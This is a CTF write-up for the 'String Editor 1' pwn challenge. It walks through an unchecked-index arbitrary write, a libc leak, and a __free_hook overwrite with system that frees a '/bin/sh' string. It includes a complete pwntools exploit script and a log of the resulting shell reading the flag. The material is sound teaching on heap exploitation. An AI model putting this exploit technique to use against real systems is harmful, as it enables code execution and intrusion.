# String Editor 1

The description for this challenge is as follows:

*Editing strings as a service? wow.*

The challenge was worth 200 points, and it appears to have had 65 solves at the end of the competition. I would peg it as a medium-difficulty pwn challenge. In terms of downloadbles, you get both the binary and a libc file that corresponds with that used in Ubuntu 20, so if you have access to that machine, this will be easiest place to debug locally. 

**TL;DR Solution:** You can write to anywhere in the binary by providing a large enough index, so you can write to anywhere in libc by calculating an offset based on the provided leaks. So you can overwrite the contents of __free_hook to address of system in the libc, edit the contents of your string to /bin/sh, then free it. The free will put that /bin/sh into the rdi register before calling the free hook, so you end up called system(/bin/sh) and get a shell.

## Gathering Information

When we run the program, we seem to be given some kind of libc leak automatically. We then get to edit a string, and we are given another leak that appears to be from the heap. 
```
knittingirl@piglet:~/CTF/imaginaryCTF$ nc chal.imaginaryctf.org 42004
Welcome to StringEditor™!
Today, you will have the AMAZING opportunity to edit a string!
But first, a word from our sponsors: 0x7ff33da2a410

The amazing, cool, epic, astounding, astonishing, stunning, breathtaking, supercalifragilisticexpialidocious string is:
****************
What character would you like to edit? (enter in 15 to get a fresh pallette)
1
What character should be in that index?
a
DEBUG: 0x55d4d37742a1
Done.
The amazing, cool, epic, astounding, astonishing, stunning, breathtaking, supercalifragilisticexpialidocious string is:
*a**************
What character would you like to edit? (enter in 15 to get a fresh pallette)
15
What character should be in that index?
f
DEBUG: 0x55d4d37742af
Done.
The amazing, cool, epic, astounding, astonishing, stunning, breathtaking, supercalifragilisticexpialidocious string is:
***************f
What character would you like to edit? (enter in 15 to get a fresh pallette)
```
The next step is to open the binary up in Ghidra, or your favorite alternative decompiler. The main function is labelled, and it decompiles fairly clearly. We can see that the first leak is for the libc address of the system function:
```
printf("But first, a word from our sponsors: %p\n\n",system);
```
The interesting portion of the function is within a while(true) loop, so it will go on indefinitely. The second leak that gets printed out is the address of whatever location we edited after selecting an index and character. There is also no boundary check on our input, which is read in as a long integer and thus should be able to get quite large. As a result, <u>it is basically a write-anywhere gadget as long as we know the offset between our string in the heap and our desired write location</u>. If we enter 15 for our index, the string is freed and re-malloced with the default sequence of asterisks.
```
  do {
    printf(
           "The amazing, cool, epic, astounding, astonishing, stunning, breathtaking,supercalifragilisticexpialidocious string is:\n%s\n"
           ,the_string);
    puts("What character would you like to edit? (enter in 15 to get a fresh pallette)");
    __isoc99_scanf("%ld%*c",&chosen_index);
    if (chosen_index == 0xf) {
      free(the_string);
      the_string = (undefined8 *)malloc(0x10);
      *the_string = 0x2a2a2a2a2a2a2a2a;
      the_string[1] = 0x2a2a2a2a2a2a2a2a;
      *(undefined *)(the_string + 2) = 0;
    }
    puts("What character should be in that index?");
    __isoc99_scanf("%c%*c",&local_21);
                    /* This is leaking the location that we edited */
    printf("DEBUG: %p\n",(long)the_string + chosen_index,chosen_index);
    *(undefined *)(chosen_index + (long)the_string) = local_21;
    puts("Done.");
  } while( true );
}
```
Finally, we run checksec on the binary to finalize this phase. In short, it has all of the protections except a canary. PIE is enabled, which would make jumping to anything within the code section difficult without additional leaks. In addition, Full RELRO practically means that we can't overwrite GOT entries or the fini array, even if we could find them. 
```
knittingirl@piglet:~/CTF/imaginaryCTF$ checksec string_editor_1
[*] '/home/knittingirl/CTF/imaginaryCTF/string_editor_1'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

## Writing the Exploit

Based on all of that information, the strategy that makes the most sense is to plan to overwrite either the malloc or free hook, which is a popular strategy for dealing with full RELRO. These are structures that are typically set to 0, but they can hold an address that will be executed when malloc or free are called. They are located within libc, so our leak should let us find them, and the write protection does not extend to them. Since I can trigger free relatively easily by selecting an index of 15, overwriting free hook is the logical choice.

Traditionally, malloc or free hook overwrites are carried out using a onegadget, which is an address in libc that will execute execve(/bin/sh) if certain constraints are met. While this libc version does technically include onegadgets, their constraints are hard to meet, and while I did attempt to use them, I noticed while debugging that they did not work. 
```
knittingirl@piglet:~/CTF/imaginaryCTF$ one_gadget libc.so.6
0xe6e73 execve("/bin/sh", r10, r12)
constraints:
  [r10] == NULL || r10 == NULL
  [r12] == NULL || r12 == NULL

0xe6e76 execve("/bin/sh", r10, rdx)
constraints:
  [r10] == NULL || r10 == NULL
  [rdx] == NULL || rdx == NULL

0xe6e79 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL

```
I got a bit concerned at this point and started looking for ways to pivot to a short ROP chain from my free hook overwrite. That is, in fact, apparently something that you can do (See this link for more: https://lkmidas.github.io/posts/20210103-heap-seccomp-rop/), but as I was reading it, I realized that the call gadget was working was because you can control the rdi gadget when you free a string. The string is passed as free's first argument, and since I control it, I can just set it to "/bin/sh", set the free hook to the address of system, and achieve a shell! 

## The Exploit Itself

The full exploit in Python is shown below.
```
from pwn import *

#For local debugging
#target = process('./string_editor_1', env={"LD_PRELOAD":"./libc.so.6"})
#pid = gdb.attach(target, "\nb *main+394\nb *main+268\n set disassembly-flavor intel\ncontinue")

target = remote('chal.imaginaryctf.org', 42004)

libc = ELF('libc.so.6')

print(target.recvuntil(b'sponsors: '))
leak = target.recv(14)
system = int(leak, 16)
print(hex(system))
libc_base = system - libc.symbols['system']
free_hook = libc_base + libc.symbols['__free_hook']
print(hex(free_hook))

#My failed onegadget experiment! I left it in for posterity.
onegadget1 = libc_base + 0xe6e73
onegadget2 = libc_base + 0xe6e76
onegadget3 = libc_base + 0xe6e79
print('onegadget 1 at', hex(onegadget1))
print('onegadget 2 at', hex(onegadget2))
print('onegadget 3 at', hex(onegadget3))

#
print(target.recvuntil(b'pallette)'))
target.sendline(b'0')
print(target.recvuntil(b'index?'))
target.sendline(b'a')

print(target.recvuntil(b'DEBUG: '))
leak = target.recv(14)

#Determining the index that I need to enter
overwrite_base = int(leak, 16)
offset = free_hook - overwrite_base
#Now divide the onegadget into 6 bytes:


payload = p64(system)
#Overwrite the rdi passed to free, one character at a time:
line = b'/bin/sh\x00'
for i in range(8):
	print(target.recvuntil(b'pallette)'))
	target.sendline(str(i).encode('ascii'))
	print(target.recvuntil(b'index?'))
	target.sendline(line[i].to_bytes(1, 'little'))

#Since libc addresses are only 6 bytes long, I can save a little bit of time by only overwriting 6 bytes.
for i in range(6):
	payload_part = payload[i].to_bytes(1, 'little')
	print(payload_part)
	final_offset = offset + i
	print(target.recvuntil(b'pallette)'))
	target.sendline(str(final_offset).encode('ascii'))
	print(target.recvuntil(b'index?'))
	target.sendline(payload_part) 	
	
print(target.recvuntil(b'pallette)'))
target.sendline(b'15')

target.interactive()
```
And here is what it looks like when run in the terminal:
```
knittingirl@piglet:~/CTF/imaginaryCTF$ python3 string_editor_payload.py 
[+] Opening connection to chal.imaginaryctf.org on port 42004: Done
[*] '/home/knittingirl/CTF/imaginaryCTF/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
b'Welcome to StringEditor\xe2\x84\xa2!\nToday, you will have the AMAZING opportunity to edit a string!\nBut first, a word from our sponsors: '
0x7f678eeeb410
0x7f678f084b28
binsh is at 0x7f678f04d5aa
pop rdi is at 0x7f678eebcb72
onegadget 1 at 0x7f678ef7ce73
onegadget 2 at 0x7f678ef7ce76
onegadget 3 at 0x7f678ef7ce79
b'\n\nThe amazing, cool, epic, astounding, astonishing, stunning, breathtaking, supercalifragilisticexpialidocious string is:\n****************\nWhat character would you like to edit? (enter in 15 to get a fresh pallette)'
b'\nWhat character should be in that index?'
b'\nDEBUG: '
b'\nDone.\nThe amazing, cool, epic, astounding, astonishing, stunning, breathtaking, supercalifragilisticexpialidocious string is:\na***************\nWhat character would you like to edit? (enter in 15 to get a fresh pallette)'
b'\nWhat character should be in that index?'
b'\nDEBUG: 0x55f3ffa3d2a0\nDone.\nThe amazing, cool, epic, astounding, astonishing, stunning, breathtaking, supercalifragilisticexpialidocious string is:\n/***************\nWhat character would you like to edit? (enter in 15 to get a fresh pallette)'
b'\nWhat character should be in that index?'
b'\nDEBUG: 0x55f3ffa3d2a1\nDone.\nThe amazing, cool, epic, astounding, astonishing, stunning, breathtaking, supercalifragilisticexpialidocious string is:\n/b**************\nWhat character would you like to edit? (enter in 15 to get a fresh pallette)'
b'\nWhat character should be in that index?'
b'\nDEBUG: 0x55f3ffa3d2a2\nDone.\nThe amazing, cool, epic, astounding, astonishing, stunning, breathtaking, supercalifragilisticexpialidocious string is:\n/bi*************\nWhat character would you like to edit? (enter in 15 to get a fresh pallette)'
b'\nWhat character should be in that index?'
b'\nDEBUG: 0x55f3ffa3d2a3\nDone.\nThe amazing, cool, epic, astounding, astonishing, stunning, breathtaking, supercalifragilisticexpialidocious string is:\n/bin************\nWhat character would you like to edit? (enter in 15 to get a fresh pallette)'
b'\nWhat character should be in that index?'
b'\nDEBUG: 0x55f3ffa3d2a4\nDone.\nThe amazing, cool, epic, astounding, astonishing, stunning, breathtaking, supercalifragilisticexpialidocious string is:\n/bin/***********\nWhat character would you like to edit? (enter in 15 to get a fresh pallette)'
b'\nWhat character should be in that index?'
b'\nDEBUG: 0x55f3ffa3d2a5\nDone.\nThe amazing, cool, epic, astounding, astonishing, stunning, breathtaking, supercalifragilisticexpialidocious string is:\n/bin/s**********\nWhat character would you like to edit? (enter in 15 to get a fresh pallette)'
b'\nWhat character should be in that index?'
b'\nDEBUG: 0x55f3ffa3d2a6\nDone.\nThe amazing, cool, epic, astounding, astonishing, stunning, breathtaking, supercalifragilisticexpialidocious string is:\n/bin/sh*********\nWhat character would you like to edit? (enter in 15 to get a fresh pallette)'
b'\nWhat character should be in that index?'
b'\x10'
b'\nDEBUG: 0x55f3ffa3d2a7\nDone.\nThe amazing, cool, epic, astounding, astonishing, stunning, breathtaking, supercalifragilisticexpialidocious string is:\n/bin/sh\nWhat character would you like to edit? (enter in 15 to get a fresh pallette)'
b'\nWhat character should be in that index?'
b'\xb4'
b'\nDEBUG: 0x7f678f084b28\nDone.\nThe amazing, cool, epic, astounding, astonishing, stunning, breathtaking, supercalifragilisticexpialidocious string is:\n/bin/sh\nWhat character would you like to edit? (enter in 15 to get a fresh pallette)'
b'\nWhat character should be in that index?'
b'\xee'
b'\nDEBUG: 0x7f678f084b29\nDone.\nThe amazing, cool, epic, astounding, astonishing, stunning, breathtaking, supercalifragilisticexpialidocious string is:\n/bin/sh\nWhat character would you like to edit? (enter in 15 to get a fresh pallette)'
b'\nWhat character should be in that index?'
b'\x8e'
b'\nDEBUG: 0x7f678f084b2a\nDone.\nThe amazing, cool, epic, astounding, astonishing, stunning, breathtaking, supercalifragilisticexpialidocious string is:\n/bin/sh\nWhat character would you like to edit? (enter in 15 to get a fresh pallette)'
b'\nWhat character should be in that index?'
b'g'
b'\nDEBUG: 0x7f678f084b2b\nDone.\nThe amazing, cool, epic, astounding, astonishing, stunning, breathtaking, supercalifragilisticexpialidocious string is:\n/bin/sh\nWhat character would you like to edit? (enter in 15 to get a fresh pallette)'
b'\nWhat character should be in that index?'
b'\x7f'
b'\nDEBUG: 0x7f678f084b2c\nDone.\nThe amazing, cool, epic, astounding, astonishing, stunning, breathtaking, supercalifragilisticexpialidocious string is:\n/bin/sh\nWhat character would you like to edit? (enter in 15 to get a fresh pallette)'
b'\nWhat character should be in that index?'
b'\nDEBUG: 0x7f678f084b2d\nDone.\nThe amazing, cool, epic, astounding, astonishing, stunning, breathtaking, supercalifragilisticexpialidocious string is:\n/bin/sh\nWhat character would you like to edit? (enter in 15 to get a fresh pallette)'
[*] Switching to interactive mode

$ ls
flag.txt
run
$ cat flag.txt
ictf{alw4ys_ch3ck_y0ur_1nd1c3s!_4e42c9f2}
$  

```

Thanks for reading!
